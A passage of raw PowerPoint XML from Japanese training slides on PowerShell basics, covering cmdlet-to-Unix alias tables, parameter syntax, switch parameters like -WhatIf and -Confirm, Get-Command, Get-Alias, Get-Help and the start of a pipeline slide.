                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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i="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Copy-Item</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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i="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cp</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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44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i="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Move</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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i="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Move-Item</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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i="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mv</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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097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i="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Remove</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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i="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Remove-Item</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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i="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rm, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" i="0" dirty="0" err="1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rmdir</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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346890"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0C137E3-28D8-214B-A5F6-0129483DE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3429000"/>
            <a:ext cx="5580065" cy="306237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 algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n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大文字・小文字は区別されない。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n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パラメーターは「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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t> 文字列 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」。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n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変数は「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$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>変数名 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」。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n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Tab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補完、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Ctrl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＋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Space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補完。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n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Ctrl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＋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Home: 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行頭まで削除</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n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Ctrl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＋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End: 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行末まで削除</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n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Get-Verb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で動詞の一覧を取得。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2101456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EA6B0C0F-69FB-0BD5-16CA-7986E6713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基本事項 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>パラメーター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556FF32-0123-4259-E524-5E7A2587FA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24884E-13C9-8D06-57A7-693DE86BD5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4</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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D5EC013D-D1D5-E61A-9B89-F905EBAD5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20" y="961505"/>
            <a:ext cx="7020780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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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位置指定パラメーター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6E702B28-680C-3875-6107-30B790C61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20" y="5048384"/>
            <a:ext cx="4860218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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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スイッチパラメーター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6FB00EF9-78A7-2B2D-B983-7FE578EA1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1330837"/>
            <a:ext cx="10440989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よく使う必須パラメーター名は、省略可能（位置で指定）であることが多い。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EED15AA-E548-4CD9-C23C-12E64A1C4510}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1779672" y="1736812"/>
            <a:ext cx="7489564" cy="7078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ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Copy-Item </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Path </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>./A.txt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Destination</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="20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2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>./B.txt</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Copy-Item ./A.txt ./B.txt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170473F-CF16-7410-277C-6ACF38552883}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2998776" y="2512119"/>
            <a:ext cx="8137784" cy="2462213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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1800" b="1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Path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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en-US" altLang="ja-JP" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="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System.String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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[]&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP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Specifies, as a string array, the path to the items to copy. Wildcard characters are permitted. </a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US" sz="10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ja-JP" altLang="en-US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　必須　　　　　　　　　　　　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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true</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US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　位置　　　　　　　　　　　　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US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　既定値　　　　　　　　　　　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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None</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US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　パイプライン入力を許可する　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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True (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ByPropertyName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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ja-JP" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ByValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US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　ワイルドカード文字を許可する　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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true</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="矢印: 下 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64F46445-3CD4-3DF1-D2C1-C7E8C2844C2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="3385716">
            <a:off x="7291732" y="3596442"/>
            <a:ext cx="288032" cy="432048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AC5DB9B-5F06-3352-3530-197016077994}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7608168" y="3317866"/>
            <a:ext cx="2628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省略できないものは</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>「</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>named</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>」になる。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA0132EB-5F2C-BB16-7D09-96DF2F1F4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5408118"/>
            <a:ext cx="10440989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引数を取らないパラメーター（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true/false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）。以下に例を示す。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70098BB2-975D-E012-C13D-F6264F287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735617"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1775520" y="5764370"/>
          <a:ext cx="7156673" cy="79248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287248">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130588"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5869425">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="429024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WhatIf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影響のあるオブジェクトの変更内容を表示。実行しない。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14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-Confirm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実行前にユーザーに確認を求める。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370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7171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EA6B0C0F-69FB-0BD5-16CA-7986E6713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基本事項 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サバイバル</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Cmdlets</a:t>
            </a:r>
            <a:endParaRPr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556FF32-0123-4259-E524-5E7A2587FA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24884E-13C9-8D06-57A7-693DE86BD5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5</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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D5EC013D-D1D5-E61A-9B89-F905EBAD5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20" y="961505"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-Command</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1996473A-5FFE-BDA2-06EE-102B6B0252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728231"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="9358146" y="841359"/>
          <a:ext cx="1959142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142">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="429024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CommandType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14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Alias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370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Function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033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Cmdlet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367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Application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462737"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71EFB520-78EB-B8C0-306C-526A1640F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20" y="2044188"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-Alias</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr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6E702B28-680C-3875-6107-30B790C61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20" y="5048384"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-Help</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ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ABF101B-4C00-1A98-FBC9-E7BF8B08C03D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1882800" y="5841268"/>
            <a:ext cx="8280920" cy="7078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ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Get-Help </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Command</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Online</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>（ネット不可なら</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ShowWindow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>）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&gt; Get-Help –Category Helpfile</a:t>
            </a:r>
            <a:endParaRPr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6FB00EF9-78A7-2B2D-B983-7FE578EA1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2456056"/>
            <a:ext cx="10440989" cy="7925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Alias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は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Cmdlet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の短縮名。引数は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PowerShell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のまま。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just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名前が衝突する外部アプリを実行するときには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.exe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をつける。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ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335ED61-3D11-527E-6C4E-A0BD7F1472A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8350458" y="3319824"/>
            <a:ext cx="2966122" cy="8617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ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(Get-Alias).Count </a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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161</a:t>
            </a:r>
            <a:endParaRPr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EED15AA-E548-4CD9-C23C-12E64A1C4510}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1882800" y="3319824"/>
            <a:ext cx="6301432" cy="1477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ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Get-Alias curl</a:t>
            </a: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CommandType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     Name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-----------     ----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Alias           curl -&gt; Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49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60662AF-F40D-FB2E-7963-B42084EF538E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1882800" y="1379309"/>
            <a:ext cx="7345548" cy="40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ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Get-Command *service*</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{78EFEA58-3AAF-1CE2-1814-8170F6858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5445224"/>
            <a:ext cx="10440989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各コマンドのヘルプのほか、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about_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で始まるトピックヘルプがある（下）。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea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8867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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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基本事項 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>パイプライン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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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6</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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40FDA9BE-6AFF-D6D4-6343-B2860ABCE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992" y="903347"/>
            <a:ext cx="10447513" cy="7925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UNIX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のパイプは主に</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>プロセス間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で</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>文字列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を受け渡す。</a:t>
            </a:r>
          </a:p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PowerShell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のパイプは主に</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>間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で</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>オブジェクトの要素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を</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
